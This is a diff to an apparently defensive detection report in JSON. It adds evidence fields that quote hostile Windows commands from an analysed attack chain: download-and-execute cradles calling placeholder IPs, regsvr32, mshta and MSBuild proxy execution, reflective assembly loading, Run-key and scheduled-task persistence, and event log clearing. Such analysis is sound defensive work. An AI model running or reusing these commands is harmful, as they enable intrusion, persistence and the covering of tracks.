@@ -7,7 +7,8 @@
     "files": "20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": "T1059.001, T1105",
-    "atlas": "AML.T0072, AML.T0050"
+    "atlas": "AML.T0072, AML.T0050",
+    "evidence": "IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)"
   },
   {
     "finding": "EventLogClearing",
@@ -17,7 +18,8 @@
     "files": "20261020_101500_step04_persist.ps1, 20261020_103000_step07_cleanup.bat, proc_20261020_103500.jsonl",
     "attribution": null,
     "attack": "T1685.005",
-    "atlas": "AML.T0138"
+    "atlas": "AML.T0138",
+    "evidence": "wevtutil cl Security (20261020_101500_step04_persist.ps1:3)\nwevtutil cl System (20261020_103000_step07_cleanup.bat:3)\nwevtutil cl Security (proc_20261020_103500.jsonl)"
   },
   {
     "finding": "FileDownload",
@@ -27,7 +29,8 @@
     "files": "20261020_100500_step02_download.ps1, 20261020_102000_step05_dotnet.ps1, 20261020_102500_step06_pinvoke.ps1, 20261020_103000_step07_cleanup.bat, build_20261020_101200.xml, loader_20261020_102600.cs, proc_20261020_103500.jsonl",
     "attribution": null,
     "attack": "T1105",
-    "atlas": "AML.T0072"
+    "atlas": "AML.T0072",
+    "evidence": "certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nbitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\\Users\\Public\\b.bin (20261020_100500_step02_download.ps1:3)\nStart-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\\Users\\Public\\c.bin (20261020_100500_step02_download.ps1:4)\npublic override bool Execute() { new WebClient().DownloadFile(\"http://203.0.113.10/d.bin\", \"d.bin\"); return true; } (build_20261020_101200.xml)\n$b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nIEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)\nclass L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)\ncertutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)\ncertutil -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (proc_20261020_103500.jsonl)"
   },
   {
     "finding": "NetworkSocket",
@@ -37,7 +40,8 @@
     "files": "20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": "T1095",
-    "atlas": "AML.T0072"
+    "atlas": "AML.T0072",
+    "evidence": "$tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)"
   },
   {
     "finding": "RunKeyPersistence",
@@ -47,7 +51,8 @@
     "files": "20261020_101500_step04_persist.ps1",
     "attribution": null,
     "attack": "T1547.001",
-    "atlas": "AML.T0142"
+    "atlas": "AML.T0142",
+    "evidence": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)"
   },
   {
     "finding": "ScheduledTaskCreation",
@@ -57,7 +62,8 @@
     "files": "20261020_101500_step04_persist.ps1, proc_20261020_103500.jsonl",
     "attribution": null,
     "attack": "T1053.005",
-    "atlas": null
+    "atlas": null,
+    "evidence": "schtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nschtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)"
   },
   {
     "finding": "Domain",
@@ -67,7 +73,8 @@
     "files": "build_20261020_101200.xml",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -77,7 +84,8 @@
     "files": "build_20261020_101200.xml, loader_20261020_102600.cs",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -87,7 +95,8 @@
     "files": "build_20261020_101200.xml",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "EncodedCommand",
@@ -97,7 +106,8 @@
     "files": "20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "IPv4",
@@ -107,7 +117,8 @@
     "files": "20261020_100500_step02_download.ps1, 20261020_101000_step03_exec.ps1, 20261020_103000_step07_cleanup.bat, build_20261020_101200.xml, proc_20261020_103500.jsonl",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "IPv4",
@@ -117,7 +128,8 @@
     "files": "20261020_102000_step05_dotnet.ps1, 20261020_102500_step06_pinvoke.ps1, loader_20261020_102600.cs",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "IPv4",
@@ -127,7 +139,8 @@
     "files": "20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -137,7 +150,8 @@
     "files": "20261020_100500_step02_download.ps1, proc_20261020_103500.jsonl",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -147,7 +161,8 @@
     "files": "20261020_100500_step02_download.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -157,7 +172,8 @@
     "files": "20261020_100500_step02_download.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -167,7 +183,8 @@
     "files": "20261020_103000_step07_cleanup.bat",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -177,7 +194,8 @@
     "files": "build_20261020_101200.xml",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -187,7 +205,8 @@
     "files": "20261020_101000_step03_exec.ps1, proc_20261020_103500.jsonl",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -197,7 +216,8 @@
     "files": "20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -207,7 +227,8 @@
     "files": "loader_20261020_102600.cs",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -217,7 +238,8 @@
     "files": "20261020_102000_step05_dotnet.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -227,7 +249,8 @@
     "files": "build_20261020_101200.xml",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -237,7 +260,8 @@
     "files": "20261020_100500_step02_download.ps1, 20261020_102000_step05_dotnet.ps1, 20261020_102500_step06_pinvoke.ps1, 20261020_103000_step07_cleanup.bat",
     "attribution": null,
     "attack": "TA0011",
-    "atlas": "AML.TA0014"
+    "atlas": "AML.TA0014",
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -247,7 +271,8 @@
     "files": "20261020_101500_step04_persist.ps1, 20261020_103000_step07_cleanup.bat",
     "attribution": null,
     "attack": "TA0112",
-    "atlas": "AML.TA0007"
+    "atlas": "AML.TA0007",
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -257,7 +282,8 @@
     "files": "20261020_101500_step04_persist.ps1",
     "attribution": null,
     "attack": "TA0003",
-    "atlas": "AML.TA0006"
+    "atlas": "AML.TA0006",
+    "evidence": null
   },
   {
     "finding": "NativeApiCall",
@@ -267,7 +293,8 @@
     "files": "20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": "T1106, T1055",
-    "atlas": null
+    "atlas": null,
+    "evidence": "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)\n[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)"
   },
   {
     "finding": "ProcessStart",
@@ -277,7 +304,8 @@
     "files": "20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": "T1059, T1047",
-    "atlas": "AML.T0050"
+    "atlas": "AML.T0050",
+    "evidence": "[System.Diagnostics.Process]::Start(\"cmd.exe\", \"/c whoami\") (20261020_102500_step06_pinvoke.ps1:11)"
   },
   {
     "finding": "ReflectiveCodeLoading",
@@ -287,7 +315,8 @@
     "files": "20261020_102000_step05_dotnet.ps1, loader_20261020_102600.cs",
     "attribution": null,
     "attack": "T1620",
-    "atlas": null
+    "atlas": null,
+    "evidence": "$asm = [System.Reflection.Assembly]::Load($out.ToArray()) (20261020_102000_step05_dotnet.ps1:11)\n$asm.EntryPoint.Invoke($null, @(,[string[]]@())) (20261020_102000_step05_dotnet.ps1:12)\nclass L { static void Main() { var b = new WebClient().DownloadData(\"http://203.0.113.20/p.bin\"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)"
   },
   {
     "finding": "RuntimeCompilation",
@@ -297,7 +326,8 @@
     "files": "20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": "T1027.004",
-    "atlas": "AML.T0123"
+    "atlas": "AML.T0123",
+    "evidence": "Add-Type -TypeDefinition $src (20261020_102500_step06_pinvoke.ps1:9)"
   },
   {
     "finding": "SignedBinaryProxyExecution",
@@ -307,7 +337,8 @@
     "files": "20261020_101000_step03_exec.ps1, 20261020_101500_step04_persist.ps1, proc_20261020_103500.jsonl",
     "attribution": null,
     "attack": "T1218, T1127",
-    "atlas": null
+    "atlas": null,
+    "evidence": "rundll32.exe C:\\Users\\Public\\a.dll,Start (20261020_101000_step03_exec.ps1:1)\nregsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\nmshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\build_20261020_101200.xml (20261020_101000_step03_exec.ps1:4)\ncmd.exe /c \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /U C:\\Users\\Public\\a.dll\" (20261020_101000_step03_exec.ps1:5)\nschtasks.exe /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)\nreg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /f (20261020_101500_step04_persist.ps1:2)\nregsvr32 /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (proc_20261020_103500.jsonl)\nschtasks /create /tn Updater /tr \"rundll32.exe C:\\Users\\Public\\a.dll,Start\" /sc onlogon /f (proc_20261020_103500.jsonl)"
   },
   {
     "finding": "Domain",
@@ -317,7 +348,8 @@
     "files": "20261020_101000_step03_exec.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -327,7 +359,8 @@
     "files": "20261020_101000_step03_exec.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -337,7 +370,8 @@
     "files": "20261020_101000_step03_exec.ps1, 20261020_101500_step04_persist.ps1, 20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": "TA0002",
-    "atlas": "AML.TA0005"
+    "atlas": "AML.TA0005",
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -347,7 +381,8 @@
     "files": "20261020_101000_step03_exec.ps1, 20261020_101500_step04_persist.ps1, 20261020_102000_step05_dotnet.ps1, 20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": "TA0005",
-    "atlas": "AML.TA0007"
+    "atlas": "AML.TA0007",
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -357,7 +392,8 @@
     "files": "20261020_100000_step01_recon.ps1",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -367,6 +403,7 @@
     "files": "20261020_100000_step01_recon.ps1, 20261020_102500_step06_pinvoke.ps1",
     "attribution": null,
     "attack": "TA0007",
-    "atlas": "AML.TA0008"
+    "atlas": "AML.TA0008",
+    "evidence": null
   }
 ]
